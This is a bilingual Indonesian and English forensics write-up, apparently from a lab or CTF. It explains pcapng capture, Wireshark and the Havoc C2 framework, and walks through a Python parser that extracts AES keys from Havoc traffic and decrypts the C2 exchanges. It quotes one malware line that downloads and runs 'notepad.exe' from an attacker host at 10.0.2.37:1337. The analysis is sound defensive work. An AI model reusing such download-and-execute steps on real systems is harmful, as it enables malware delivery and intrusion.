Apa itu file ekstensi pcapng:
.pcapng adalah format file yang merekam lalu lintas jaringan — bayangin kayak rekaman CCTV untuk paket jaringan. File ini nyimpen semua paket data yang lewat di jaringan: alamat IP, port, protokol (HTTP, DNS, TLS, dll.), waktu kejadian, dan kadang isi pesan (payload) kalau gak terenkripsi.

Kenapa penting?
- Karena dari file ini kita bisa:
- Lacak aktivitas (siapa ngobrol sama siapa),
- Deteksi serangan (scan, brute-force, malware traffic),
- Rekonstruksi sesi (mis. lihat isi web request kalau nggak terenkripsi).

jadi kita akan analisa log jaringan dengan tool Wireshark atau Tshark(CLI Version)
🧠 Apa itu Wireshark?
Wireshark itu kayak “microscope” buat jaringan.
Dia bisa ngintip, ngerekam, dan menganalisis paket data yang lewat di jaringan kamu — mirip kayak CCTV buat lalu lintas internet 🔍
- Bisa liat siapa ngobrol sama siapa (IP sumber & tujuan)
- Protokol apa yang dipakai (HTTP, DNS, TCP, dll.)
- Bahkan bisa liat isi pesan kalau belum terenkripsi!

Apa itu?
Havoc adalah salah satu command-and-control (C2) / post-exploitation framework yang dibuat untuk mengontrol agen (implant) di mesin korban setelah eksploitasi berhasil. Bayangin dia seperti remote control yang dipakai penyerang untuk:

- menjalankan perintah jarak jauh,
- memindai file / proses,
- memindahkan file,
- menjalankan modul-modul tambahan (eksfiltrasi, persistence, lateral move),
semua lewat kanal ter-enkapsulasi (HTTP/S, DNS atau custom).

Secara konsep, Havoc mirip framework lain yang sering dibahas di security: Covenant, Sliver, Cobalt Strike (commercial). Versi modern dari framework semacam ini biasanya modular — artinya operator bisa tambah modul/skrip untuk fungsi baru.

def tsharkbody_to_bytes(hex_string):
    """
    Converts a TShark hex formated string to a byte string.
    
    :param hex_string: The hex string from TShark.
    :return: The byte string.
    """
    # its concatonated strings
    hex_string = hex_string.replace(':', '')
    #unhex it
    hex_bytes = unhexlify(hex_string)
    return hex_bytes



def aes_decrypt_ctr(aes_key, aes_iv, encrypted_payload):
    """
    Decrypts an AES-encrypted payload in CTR mode.

    :param aes_key: The AES key as a byte string.
    :param aes_iv: The AES IV (Initialization Vector) for the counter, as a byte string.
    :param encrypted_payload: The encrypted payload as a byte string.
    :return: The decrypted plaintext as a byte string.
    """
    # Initialize the counter for CTR mode
    ctr = Counter.new(128, initial_value=int.from_bytes(aes_iv, byteorder='big'))

    # Create the cipher in CTR mode
    cipher = AES.new(aes_key, AES.MODE_CTR, counter=ctr)

    # Decrypt the payload
    decrypted_payload = cipher.decrypt(encrypted_payload)

    return decrypted_payload



def parse_header(header_bytes):
    """
    Parses a 20-byte header into an object.

    :param header_bytes: A 20-byte header.
    :return: A dictionary representing the parsed header.
    """
    if len(header_bytes) != 20:
        raise ValueError("Header must be exactly 20 bytes long")

    # Unpack the header
    payload_size, magic_bytes, agent_id, command_id, mem_id = struct.unpack('>I4s4sI4s', header_bytes)

    # Convert bytes to appropriate representations
    magic_bytes_str = binascii.hexlify(magic_bytes).decode('ascii')
    agent_id_str = binascii.hexlify(agent_id).decode('ascii')
    mem_id_str = binascii.hexlify(mem_id).decode('ascii')
    command_name = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')

    return {
        'payload_size': payload_size,
        'magic_bytes': magic_bytes_str,
        'agent_id': agent_id_str,
        'command_id': command_name,
        'mem_id': mem_id_str
    }


def parse_request(http_pair, magic_bytes, save_path):
    request = http_pair['request']
    response = http_pair['response']#

    unique_id = uuid4()

    print("[+] Parsing Request")


    try:
        request_body = tsharkbody_to_bytes(request.get('file_data', ''))
        header_bytes = request_body[:20]
        request_payload = request_body[20:]
        request_header = parse_header(header_bytes)
    except Exception as e:
        print(f"[!] Error parsing request body: {e}")
        return


    # If there is no magic this is not Havoc
    if request_header.get("magic_bytes", '') != magic_bytes:
        return


    if request_header['command_id'] == 'DEMON_INIT':
        print("[+] Found Havoc C2")
        print(f"  [-] Agent ID: {request_header['agent_id']}")
        print(f"  [-] Magic Bytes: {request_header['magic_bytes']}")
        print(f"  [-] C2 Address: {request.get('uri')}")

        aes_key = request_body[20:52]
        aes_iv = request_body[52:68]

        print(f"  [+] Found AES Key")
        print(f"    [-] Key: {binascii.hexlify(aes_key).decode('ascii')}")
        print(f"    [-] IV: {binascii.hexlify(aes_iv).decode('ascii')}")

        if request_header['agent_id'] not in sessions:
            sessions[request_header['agent_id']] = {
                "aes_key": aes_key,
                "aes_iv": aes_iv
            }
        
        # We dont want to process the rest of the request
        response_payload = None

    elif request_header['command_id'] == 'GET_JOB':
        print("  [+] Job Request from Server to Agent")
         # if the pcap did not contain an init or we have manually passed keys add the found keys message
        
        # Grab the response header to get the incoming request. 

        try:
            response_body = tsharkbody_to_bytes(response.get('file_data', ''))

        except Exception as e:
            print(f"[!] Error parsing request body: {e}")
            return


        header_bytes = response_body[:12]
        response_payload = response_body[12:]
        command_id = struct.unpack('<H', header_bytes[:2])[0]

        command = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')

        print(f"    [-] C2 Address: {request.get('uri')}")
        print(f"    [-] Comamnd: {command}")

    else:
        print(f"  [+] Unknown Command: {request_header['command_id']}")
        response_payload = None

    # If we have keys lets decode the payload
    aes_keys = sessions.get(request_header['agent_id'], None)

    if not aes_keys:
        print(f"[!] No AES Keys for Agent with ID {request_header['agent_id']}")
        return

    # If save_path is set, make sure the directory exists
    if save_path and not os.path.exists(save_path):
        print(f"[!] Save path {save_path} does not exist, creating")
        os.makedirs(save_path)

    # Decrypt the Request Body
    if request_payload:
        print("  [+] Decrypting Request Body")
        decrypted_request = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], request_payload)
    
        # Always print
        decoded = decrypted_request.decode('utf-8', errors='ignore').strip()
        print(f"\n\033[92m[Decrypted Request]\033[0m\n{decoded}\n\n")

        # Save only if save_path is set
        if save_path:
            save_file = f'{save_path}/{unique_id}-request-{request_header["agent_id"]}.bin'
            with open(save_file, 'wb') as output_file:
                output_file.write(decrypted_request)

    # Decrypt the Response Body
    if response_payload:
        print("  [+] Decrypting Response Body")
        
        decrypted_response = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], response_payload)
    
        # Always print
        decoded = decrypted_response.decode('utf-8', errors='ignore').strip()
        print(f"\n\033[94m[Decrypted Response - {command}]\033[0m\n{decoded}\n\n")

        # Save only if save_path is set
        if save_path:
            save_file = f'{save_path}/{unique_id}-response-{request_header["agent_id"]}.bin'
            with open(save_file, 'wb') as output_file:
                output_file.write(decrypted_response)


def read_pcap_and_get_http_pairs(pcap_file, magic_bytes, save_path):
    capture = pyshark.FileCapture(pcap_file, display_filter='http')
    http_pairs = {}
    current_stream = None
    request_data = None

    print("[+] Parsing Packets")

    for packet in capture:
        try:
            # Check if we are still in the same TCP stream
            if current_stream != packet.tcp.stream:
                # Reset for a new stream
                current_stream = packet.tcp.stream
                request_data = None

            if 'HTTP' in packet:
                if hasattr(packet.http, 'request_method'):
                    # This is a request
                    request_data = {
                        'method': packet.http.request_method,
                        'uri': packet.http.request_full_uri,
                        'headers': packet.http.get_field_value('request_line'),
                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
                    }
                elif hasattr(packet.http, 'response_code') and request_data:
                    # This is a response paired with the previous request
                    response_data = {
                        'code': packet.http.response_code,
                        'phrase': packet.http.response_phrase,
                        'headers': packet.http.get_field_value('response_line'),
                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
                    }
                    # Pair them together in a dictionary
                    http_pairs[f"{current_stream}_{packet.http.request_in}"] = {
                        'request': request_data,
                        'response': response_data
                    }

                    parse_request(http_pairs[f"{current_stream}_{packet.http.request_in}"], magic_bytes, save_path)

                    #print(http_pairs[f"{current_stream}_{packet.http.request_in}"])

                    request_data = None  # Reset request data after pairing
        except AttributeError as e:
            # Ignore packets that don't have the necessary HTTP fields
            pass

Penjelasan apa yang terjadi pada program ini:
🧩 Gambaran singkat (satu kalimat)

Script ini baca pcap (pakai pyshark), cari pasangan HTTP request/response yang pake protokol Havoc, ambil header khusus (20 bytes), ekstrak AES key/IV dari paket DEMON_INIT, lalu dekripsi payload AES-CTR untuk ditampilkan atau disimpan.

🔢 Bagian atas: imports & konstanta

pyshark — dipakai untuk parse pcap/HTTP (Wireshark engine).

Crypto.Cipher.AES & Counter — buat dekripsi AES-CTR.

demon_constants — dictionary yang menerjemahkan numeric command IDs ke nama (mis. 99 -> DEMON_INIT).

sessions = {} — tempat simpan AES key+IV untuk setiap agent (kunci per sesi).

Intinya: ini prakondisi & kamus supaya nanti output enak dibaca.

🔁 Fungsi kecil yang penting
tsharkbody_to_bytes(hex_string)

Input: string hex dari tshark/pyshark (contoh: 00:11:22:aa...)

Kerja: hapus tanda : lalu ubah jadi bytes (unhexlify).

Output: byte array yang bisa dioper ke parser/dekripsi.

Kenapa ada: pyshark menampilkan data sebagai hex string, kita perlu bytes.

aes_decrypt_ctr(aes_key, aes_iv, encrypted_payload)

Buat AES dalam mode CTR (counter).

Mengonversi IV jadi integer counter, bikin cipher, lalu decrypt ciphertext.

Kembalikan plaintext bytes.

parse_header(header_bytes)

Input: 20 bytes pertama dari file_data.

struct.unpack('>I4s4sI4s', header_bytes) memecah 20 bytes menjadi:

payload_size (4 bytes, big-endian unsigned int)

magic_bytes (4 bytes)

agent_id (4 bytes)

command_id (4 bytes, as integer)

mem_id (4 bytes)

Mengubah beberapa field ke hex strings dan mengganti command_id jadi nama via demon_constants.

Output: dict berisi payload_size, magic_bytes, agent_id, command_id (nama), mem_id.

Kenapa penting: header ini bilang “ini paket Havoc” + jenis perintah yang dikirim.

🧭 Fungsi utama: parse_request(http_pair, magic_bytes, save_path)

Ini inti proses per-request. Alur singkatnya:

Ambil request & response dari pasangan HTTP (request/response yang dipasangkan).

Bikin request_body bytes dengan tsharkbody_to_bytes.

Pisah header (20 bytes) dan payload (sisanya).

parse_header() untuk tahu apakah ini Havoc (cek magic_bytes) dan tahu jenis perintah.

Kalau DEMON_INIT (command_id == 99):

Ini paket inisialisasi — di sini script ambil AES key (32B) dan IV (16B) dari request_body[20:52] & [52:68].

Simpan ke sessions[agent_id].

Kalau GET_JOB:

Ambil response_body dan offsetnya (response punya header 12B, payload setelah 12B).

Tampilkan command id yang ada di response (parsing little-endian <H).

Jika ada aes_keys untuk agent:

Dekripsi request_payload (offset 20) dan/atau response_payload (offset 12) dengan aes_decrypt_ctr.

Print hasil dekripsi (coba decode UTF-8; kalau bukan teks tetap simpan raw bytes).

Bila --save diisi, script simpan hasil ke file unik (uuid4).

Catatan praktis: offset 20 untuk request dan offset 12 untuk response — itu kunci supaya dekripsi tepat (karena header internal berbeda panjang).

🔄 Parsing pcap & pairing HTTP: read_pcap_and_get_http_pairs

Pakai pyshark.FileCapture(pcap_file, display_filter='http') → iterate packet per packet.

Script jaga current_stream = packet.tcp.stream supaya pairing request/response dalam satu TCP stream.

Ketika bertemu packet.http.request_method → simpan request_data (method, uri, file_data).

Ketika melihat packet.http.response_code dan ada request_data → anggap itu pasangan → buat dict {request:..., response:...} dan panggil parse_request(...).

Kalau ada AttributeError (paket tidak punya field tertentu) → diabaikan.

Sederhana: fungsi ini yang “melihat” pcap, membentuk pasangan request/response dan mengirim ke parser.

🛠 CLI / main block (cara pakai)

Script menerima argumen:

--pcap (wajib) → file pcapng kamu.

opsional: --aes-key, --aes-iv, --agent-id → kalau mau inject key manual (mis. pcap tidak berisi DEMON_INIT).

--save → folder untuk menyimpan decrypted payloads.

--magic → magic bytes marker (default 'deadbeef').

Contoh jalanin: 
python3 script.py --pcap traffic.pcapng
# atau kalau sudah tahu agent/key:
python3 script.py --pcap traffic.pcapng --agent-id abcd1234 --aes-key <hex> --aes-iv <hex> --save decrypted

Script juga memvalidasi: kalau kamu kasih salah satu dari aes-key/aes-iv/agent-id, harus lengkap semua tiga.
⚠️ Keterbatasan penting & troubleshooting

    Script mengandalkan pyshark, jadi tshark & Wireshark engine harus terpasang. Kalau pyshark gagal, script exit.

    Jika http.file_data tidak terbaca / pyshark gagal rekonstruksi HTTP object → script nggak bisa decrypt. (Alternatif: pakai tshark --export-objects dan parsing manual).

    Offset (20 / 12) diasumsikan dari versi Havoc tertentu. Versi lain mungkin berbeda → hasil dekripsi jadi rusak.

    Endianness parse header '>I4s4sI4s' sesuai implementasi yang dipakai — kalau header beda format, parse salah.

✅ Ringkasan flow (apa yang script lakukan secara berurutan)

Buka pcap (pyshark) → ambil semua paket HTTP.

Pair request ↔ response per TCP stream.

Untuk tiap pair: ambil file_data → parse 20-byte header → cek magic.

Kalau DEMON_INIT → ambil AES key+IV → simpan ke sessions.

Kalau ada key → decrypt payloads dari request (offset 20) / response (offset 12).

Print/save hasil dekripsi.

### 🧩 **What is a `.pcapng` file?**

A `.pcapng` file is like a **CCTV recording** for network traffic — it captures every packet sent and received.
It stores:

* Source and destination IPs
* Ports
* Protocols (HTTP, DNS, TLS, etc.)
* Timestamps
* Sometimes even the **contents of the messages** (payloads) if they aren’t encrypted.

**Why is it important?**
Because with it, we can:

* Track communication between hosts
* Detect attacks (like scanning, brute-force, or malware traffic)
* Reconstruct sessions (e.g., see web requests if unencrypted)

We’ll analyze this network log using **Wireshark** or its CLI version, **TShark**.

---

### 🧠 **Wireshark & TShark in Simple Terms**

**Wireshark**
Think of it as a **microscope for your network** 🔬
It lets you view and analyze every packet that travels through your network:

* Who’s talking to who (source & destination IPs)
* Which protocol is being used (HTTP, DNS, TCP, etc.)
* Even see message contents if they aren’t encrypted

**TShark**
The same tool, but in **command-line form** — perfect for fast work, automation, or servers without GUIs.

$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";

This script **downloads and executes** `notepad.exe` from the attacker’s server — a classic **C2 (Command and Control)** behavior.

### 💾 **Extracting the Executable**

The report shows the sample is linked to the **Havoc Framework** — a modern **C2/Post-Exploitation tool** used by attackers to:

* Execute remote commands
* Manage files and processes
* Exfiltrate data
* Maintain persistence

Havoc is similar to **Cobalt Strike**, **Sliver**, or **Covenant** — modular, powerful, and often abused in real-world attacks.

### 🧠 **Analyzing Havoc C2 Traffic**

We’ll use an open-source parser from Immersive Labs:
👉 [HavocC2-Forensics GitHub](https://github.com/Immersive-Labs-Sec/HavocC2-Forensics/blob/main/PacketCapture/havoc-pcap-parser.py)

The script:

* Reads the `.pcapng` file
* Detects Havoc C2 traffic
* Extracts and decrypts AES-encrypted payloads
* Displays or saves the decrypted commands and responses

Install requirements:

```bash
pip install pyshark pycryptodome
```

Run the parser:

```bash
python3 havoc-pcap-parser.py --pcap traffic.pcapng
```

### 🧾 **Script Summary (Simplified)**

The parser:

1. Reads packets using PyShark
2. Finds HTTP requests/responses
3. Detects Havoc-specific headers (magic bytes `deadbeef`)
4. Extracts AES key & IV from `DEMON_INIT` packets
5. Decrypts subsequent C2 traffic (commands & responses)
6. Prints or saves decrypted content
